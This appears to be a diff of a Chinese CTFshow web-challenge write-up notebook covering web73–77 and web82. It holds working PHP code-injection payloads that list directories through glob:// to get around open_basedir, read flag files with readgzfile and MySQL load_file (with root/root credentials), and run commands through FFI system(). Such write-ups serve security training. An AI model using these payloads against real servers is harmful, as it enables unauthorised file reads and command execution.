@@ -1,4 +1,4 @@
-# **CTFshow_Web**
+# ** 	CTFshow_Web**
 
 ### **信息收集**：（完工）
 
@@ -2553,7 +2553,7 @@ c=var_export(scandir("./"));exit();
 
 我们可以尝试用glob协议绕过open_basedir协议
 
-payload:
+payload:（记得删注释）
 
 ```php
 c=?><?php $a=new DirectoryIterator("glob:///*");// 创建一个DirectoryIterator对象，遍历根目录
@@ -2569,7 +2569,7 @@ exit(0); // 终止脚本执行
 
 或者
 
-payload：
+payload：（记得删注释）
 
 ```php
 c=?><?php $a = opendir("glob:///*"); // 打开根目录，并将目录句柄赋值给$a
@@ -2792,8 +2792,213 @@ function pwn($cmd) {
     ($helper->b)($cmd);
     exit();
 }
+?>
 
 ```
+
+记得要转url
+
+![image-20241129232845637](assets/image-20241129232845637.png)
+
+##### 所以什么是uaf呢？
+
+（先挖个坑回头补）
+
+#### web73
+
+这一题和上一题的区别其实就是flag的文件改名了，我们用上一题的方法读一下文件
+
+```
+c=?><?php $a=new DirectoryIterator("glob:///*");// 创建一个DirectoryIterator对象，遍历根目录
+foreach($a as $f)// 遍历每个条目
+{
+   echo($f->__toString().' ');// 输出条目的名称，并添加一个空格
+}
+exit(0); // 终止脚本执行
+?>
+```
+
+![image-20241129234701193](assets/image-20241129234701193.png)
+
+可以看到一个flagc.txt文件
+
+这题其实已经关闭了open_basedir，所以我们也可以用之前的方法读
+
+```
+var_export(scandir('/'));exit();
+```
+
+```
+echo(implode(' ',scandir('/')));exit();
+```
+
+读文件的话上一题的uaf方法被ban了，这题用不了
+
+所以我们还是用之前方法
+
+```
+c=readgzfile('/flagc.txt');exit();
+```
+
+![image-20241129235458680](assets/image-20241129235458680.png)
+
+#### web74
+
+![image-20241129235835167](assets/image-20241129235835167.png)
+
+这题我先用之前的方法var_export试试能不能读到目录，发现显示null，应该是open_basedir打开了
+
+![image-20241130000019913](assets/image-20241130000019913.png)
+
+接着用glob协议的方法读到了，flag文件名叫做flagx.txt
+
+先用uaf的方法试试
+
+![image-20241130000253395](assets/image-20241130000253395.png)
+
+发现这条路被ban掉了
+
+![image-20241130000438521](assets/image-20241130000438521.png)
+
+最后用
+
+```
+c=readgzfile('/flagx.txt');exit();
+```
+
+成功查到了flag
+
+#### web75
+
+![image-20241130001438365](assets/image-20241130001438365.png)
+
+这题要用glob查文件，用var_export查不了
+
+接下来是读文件
+
+尝试了uaf和readgzfile之类的方法都失败了
+
+没办法看看大佬怎么做的
+
+我们其实可以用到mysql的load_file方法，从而读到flag
+
+payload:
+
+```php
+c=$conn = mysqli_connect("127.0.0.1", "root", "root", "ctftraining"); $sql = "select load_file('/flag36.txt') as a"; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result['a']; } exit();
+```
+
+豆包解释一下
+
+> 1. 数据库连接：
+>    - `$conn = mysqli_connect("127.0.0.1", "root", "root", "ctftraining");`
+>    - 这行代码使用 MySQLi 扩展建立了一个与 MySQL 数据库的连接。它指定了数据库服务器的 IP 地址为`127.0.0.1`（本地主机），用户名是`root`，密码也是`root`，要连接的数据库名称是`ctftraining`。如果连接成功，`$conn`将保存这个数据库连接对象，以便后续进行数据库操作；如果连接失败，将会产生一个错误信息（不过在这段代码中没有对连接失败情况做显式处理）。
+> 2. SQL 查询语句构建：
+>    - `$sql = "select load_file('/flag36.txt') as a";`
+>    - 这里构建了一个 SQL 查询语句。`load_file()`是 MySQL 中的一个函数，它的作用是读取指定路径的文件内容，并以字符串的形式返回。在这个查询中，它试图读取服务器上`/flag36.txt`文件的内容，并给查询结果的这一列起了一个别名`a`。
+> 3. 执行查询并获取结果：
+>    - `$row = mysqli_query($conn, $sql);`
+>    - 这行代码使用已经建立好的数据库连接`$conn`来执行前面构建的 SQL 查询语句`$sql`。如果查询执行成功，`$row`将包含查询结果集的资源对象（可以理解为指向查询结果数据的一种引用）；如果查询失败，同样会产生一个错误信息（这里也未做显式处理）。
+>    - `while($result=mysqli_fetch_array($row)){ echo $result['a']; }`
+>    - 这个`while`循环用于遍历查询结果集。`mysqli_fetch_array()`函数每次从结果集中获取一行数据，并以数组的形式返回。在循环内部，它通过`$result['a']`来获取前面查询中`load_file()`函数读取到的文件内容（因为在查询中给这一列起了别名`a`），并将其输出到屏幕上。
+> 4. 程序结束：
+>    - `exit();`
+>    - 这行代码使得脚本在完成查询结果输出后立即终止执行，不再执行后续可能存在的其他代码。
+
+也可以
+
+用PDO的方法来实现同样的目的
+
+payload:
+
+```php
+c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',
+'root');foreach($dbh->query('select load_file("/flag36.txt")') as $row)
+{echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e-
+>getMessage();exit(0);}exit(0);
+```
+
+
+
+> 1. 数据库连接建立：
+>    - `$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');`
+>    - 这行代码使用 PDO 创建了一个与 MySQL 数据库的连接对象 `$dbh`。它指定了数据库服务器的主机名为 `localhost`，要连接的数据库名称是 `ctftraining`，以及用于登录数据库的用户名 `root` 和密码 `root`。如果连接成功，后续就可以通过这个对象进行数据库相关的操作；如果连接失败，将会抛出一个 `PDOException` 异常。
+> 2. 执行查询操作：
+>    - `foreach($dbh->query('select load_file("/flag36.txt")') as $row)`
+>    - 这里通过已建立的数据库连接对象 `$dbh` 执行了一个 SQL 查询语句 `select load_file("/flag36.txt")`。`load_file()` 是 MySQL 中的一个函数，用于读取指定路径的文件内容。这个查询语句的目的就是获取服务器上 `/flag36.txt` 文件的内容。
+>    - 然后使用 `foreach` 循环来遍历查询结果集。每次循环，`$row` 将会获取到查询结果集中的一行数据，由于查询结果只有一列（即 `load_file()` 函数返回的文件内容那一列），所以可以通过 `$row[0]` 来获取这一列的值。
+>
+> #### 结果输出与资源释放
+>
+> 1. 结果输出：
+>    - `echo($row[0])."|";`
+>    - 在每次遍历查询结果集的循环中，这行代码将获取到的文件内容（通过 `$row[0]`）输出到屏幕上，并在后面添加一个 `|` 作为分隔符。
+> 2. 数据库连接资源释放：
+>    - `$dbh = null;`
+>    - 当查询结果处理完毕后，这行代码将数据库连接对象 `$dbh` 设置为 `null`，这有助于释放与该连接相关的资源，确保系统资源的合理利用。
+>
+> #### 异常处理
+>
+> 1. 捕获异常：
+>    - `catch (PDOException $e) {echo $e->getMessage();exit(0);}`
+>    - 整个 `try` 代码块被放置在一个 `try-catch` 语句中。如果在尝试建立数据库连接或执行查询等操作过程中出现任何 `PDOException` 异常（比如数据库连接失败、查询语句语法错误等情况），异常将会被这个 `catch` 块捕获。
+>    - 一旦捕获到异常，`catch` 块中的代码将会执行。这里首先通过 `$e->getMessage()` 获取到具体的异常消息，并将其输出到屏幕上，然后使用 `exit(0)` 终止脚本的执行，以防止后续可能出现的错误或未定义行为。
+
+#### web76
+
+![image-20241130003249705](assets/image-20241130003249705.png)
+
+这题依旧是用glob协议查目录，得到文件名为flag36d.txt
+
+用上一题mysql的方法，成功查到flag
+
+payload:
+
+```
+c=$conn = mysqli_connect("127.0.0.1", "root", "root", "ctftraining"); $sql = "select load_file('/flag36d.txt') as a"; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result['a']; } exit();
+```
+
+#### web77
+
+![image-20241130004911319](assets/image-20241130004911319.png)
+
+用glob协议的方法查出flag文件为flag36x.php，还有一个readflag文件
+
+接下来要看看怎么查文件
+
+![image-20241130005425204](assets/image-20241130005425204.png)
+
+上两题用到的读flag的方法（mysql）这题用不了，需要想点其他的方法
+
+官方的wp用 PHP 中的 FFI（Foreign Function Interface）方法来调用 C 语言的 system 函数，并执行一个 Shell 命令。
+
+> ##### 什么是FFI?
+>
+> PHP FFI（Foreign Function Interface）是 PHP 7.4 及以上版本引入的一个强大功能。它允许 PHP 代码直接调用 C 语言函数，从而实现了 PHP 与 C 语言的高效交互。这为 PHP 开发者提供了一种利用 C 语言的高性能和底层操作系统功能的方式。
+
+payload:
+
+```
+$ffi = FFI::cdef("int system(const char *command);");//创建一个system对象
+$a='/readflag > 1.txt';//没有回显的
+$ffi->system($a);//通过$ffi去调用system函数
+```
+
+通过执行目录中的 /readflag 程序并将其输出重定向到文件 1.txt中（因为只是执行的话没有回显）
+
+执行一下
+
+![image-20241130011301444](assets/image-20241130011301444.png)
+
+
+
+看到有回显应该是成功了，访问一下1.txt
+
+![image-20241130011352138](assets/image-20241130011352138.png)
+
+由于当前用户权限不足我们是不能直接读flag36x.php文件中的内容的，只能通过readflag（脚本里面会进行提权）来读
+
+
 
 
 
@@ -3015,6 +3220,35 @@ if(isset($_GET['file'])){
 
 #### Web82
 
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 19:34:45
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    $file = str_replace("php", "???", $file);
+    $file = str_replace("data", "???", $file);
+    $file = str_replace(":", "???", $file);
+    $file = str_replace(".", "???", $file);
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+
+
 ##### 什么是session.upload_progress？
 
 这是一道关于利用session.upload_progress进行文件包含利用的题目
@@ -3149,10 +3383,6 @@ web83的开篇设置了session_unset();session_destroy();
 
 加上了一个`system(rm -rf /tmp/*);`，但是因为本来session.upload_progress.cleanup = on，就会清空对应session文件中的内容，这里加上删除，对竞争的影响不大。（但是可能需要增加一些线程）
 
-#### web84
-
-加上了一个system(rm -rf /tmp/*);，因为本来session.upload_progress.cleanup = on，就会清空对应session文件中的内容，这里加上删除，对竞争的影响不大。（但是可能需要增加一些线程）
-
 #### web85
 
 添加了一个内容识别，如果有<就die，依旧可以竞争。
@@ -3199,10 +3429,6 @@ if(isset($_GET['file'])){
 > 使用 `file_put_contents` 函数将经过处理后的内容写入到文件中。写入的内容是先拼接了一个 `<?php die('大佬别秀了');?>` 字符串,用于在后续如果有人直接访问写入后的文件时，防止文件内容被直接执行而显示一些提示信息，然后再拼接上从 `$_POST` 中获取的 `$content` 变量的值。
 
 这道题需要用到php://filter
-
-------
-
-
 
 ##### php://filter的使用 
 
